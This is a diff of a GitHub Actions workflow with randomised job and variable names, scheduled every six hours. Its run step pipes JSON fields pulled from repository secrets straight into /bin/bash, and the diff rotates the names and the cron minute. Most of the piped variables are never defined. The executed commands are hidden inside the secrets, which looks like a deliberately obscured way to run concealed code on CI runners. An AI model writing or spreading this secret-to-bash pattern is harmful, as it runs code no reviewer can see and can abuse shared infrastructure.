@@ -1,9 +1,9 @@
 name: huangyunxiao7461
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 3/6 * * *'
+    - cron: '17 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: huangyunxiao7461
         env:
-          g2059: ${{ secrets.g2059 }}
+          uuajl92: ${{ secrets.uuajl92 }}
         run: |
-          echo $g2059 | jq -r .zd76402 | /bin/bash
-          echo $etaul0 | jq -r .mhopo99 | /bin/bash
-          echo $vckcd2 | jq -r .vkkzf98647 | /bin/bash
-          echo $ii738 | jq -r .zd44541 | /bin/bash
-          echo $duw43799 | jq -r .r0 | /bin/bash
-          echo $ahp253 | jq -r .eh2636 | /bin/bash
+          echo $uuajl92 | jq -r .ren59797 | /bin/bash
+          echo $wn27864 | jq -r .k72921 | /bin/bash
+          echo $k71727 | jq -r .pqh0 | /bin/bash
+          echo $fyuv8223 | jq -r .qfjr3 | /bin/bash
+          echo $asfje504 | jq -r .not8 | /bin/bash
+          echo $ry7 | jq -r .m62 | /bin/bash
+          echo $pa29575 | jq -r .mo0638 | /bin/bash
+          echo $rvuyb17 | jq -r .nwceq2 | /bin/bash
+          echo $oujx5 | jq -r .ipv71 | /bin/bash
+          echo $yet3648 | jq -r .bsc0 | /bin/bash
+          echo $ilfu50254 | jq -r .j73 | /bin/bash
+          echo $v56 | jq -r .hfg049 | /bin/bash
 
